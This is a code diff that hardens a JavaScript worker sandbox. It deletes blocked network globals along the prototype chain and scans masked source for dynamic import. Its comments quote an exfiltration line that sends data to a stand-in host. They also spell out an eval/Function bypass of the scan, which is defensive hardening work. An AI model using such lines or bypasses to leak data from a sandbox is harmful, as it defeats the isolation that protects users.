@@ -1,3 +1,4 @@
+import { maskNonCode } from "./maskNonCode";
 import type {
   UiScriptMessageToMain,
   UiScriptMessageToWorker,
@@ -51,8 +52,36 @@ const BLOCKED_GLOBAL_NAMES = [
   "SharedWorker",
 ];
 
-function removeBlockedGlobals() {
-  for (const globalName of BLOCKED_GLOBAL_NAMES) {
+/**
+ * Remove globals from the entire prototype chain of `globalThis`, then shadow
+ * them as own properties.
+ *
+ * Shadowing `globalThis` alone is not enough: per WebIDL, interface
+ * *operations* (`fetch`, `importScripts`) and *attributes* (`navigator`,
+ * `indexedDB`, `caches`) live on `WorkerGlobalScope.prototype`, not on the
+ * global object — an own-property shadow leaves them recoverable via
+ * `Object.getPrototypeOf(globalThis)`. WebIDL interface members are
+ * configurable, so they can be deleted outright at each chain level; the
+ * non-configurable own-property shadow then covers anything an engine keeps
+ * (or adds in future) as an own property of the global.
+ */
+export function removeGlobalsEverywhere(names: readonly string[]): void {
+  const prototypeChain: object[] = [];
+  for (
+    let level: object | null = Object.getPrototypeOf(globalThis);
+    level != null;
+    level = Object.getPrototypeOf(level)
+  ) {
+    prototypeChain.push(level);
+  }
+  for (const globalName of names) {
+    for (const level of prototypeChain) {
+      try {
+        Reflect.deleteProperty(level, globalName);
+      } catch {
+        // Non-configurable in some engines; the shadow below still covers it.
+      }
+    }
     try {
       Object.defineProperty(globalThis, globalName, {
         value: undefined,
@@ -63,6 +92,10 @@ function removeBlockedGlobals() {
       // Some globals are non-configurable in some engines; best effort.
     }
   }
+}
+
+function removeBlockedGlobals() {
+  removeGlobalsEverywhere(BLOCKED_GLOBAL_NAMES);
 }
 
 /** Resolvers for in-flight `ui.*` calls, keyed by callId. */
@@ -116,6 +149,8 @@ function describeError(error: unknown): string {
     : String(error);
 }
 
+const DYNAMIC_IMPORT_PATTERN = /\bimport\s*[.(]/;
+
 /**
  * Dynamic `import()` and `import.meta` are syntax, not properties, so
  * `removeBlockedGlobals` cannot reach them: `import("https://host/?" + data)`
@@ -124,14 +159,19 @@ function describeError(error: unknown): string {
  * before compiling, so the only route out of this realm stays the bridge.
  * (Static `import ... from` is already a SyntaxError inside `new Function`.)
  *
- * Source-level matching cannot distinguish `import(` in code from the same
- * bytes inside a string literal, so a script that carries `"import("` as data
- * is rejected too. That over-rejection is acceptable defense-in-depth: the
- * real capability boundary is main-thread dispatch, and a false positive is a
- * clear, retryable error rather than a silent failure.
+ * The scan runs on masked source (see `maskNonCode`), so comments and string
+ * contents neither smuggle an import past the check (`import∕**∕(`) nor trip
+ * it as data (`"import("`, `importlib.reload`).
+ *
+ * Residual bypass by construction: `eval("import(...)")` and
+ * `new Function("return import(...)")()` carry the payload as runtime data
+ * and no source scan can see it — `Function` cannot be removed while the
+ * realm holds any function object. Closing that hole needs a network-layer
+ * control, which is why the worker script response carries a CSP of
+ * `script-src 'unsafe-eval'; connect-src 'none'` in production builds.
  */
 export function referencesDynamicImport(script: string): boolean {
-  return /\bimport\s*[.(]/.test(script);
+  return DYNAMIC_IMPORT_PATTERN.test(maskNonCode(script));
 }
 
 async function evaluateUiScript(script: string) {
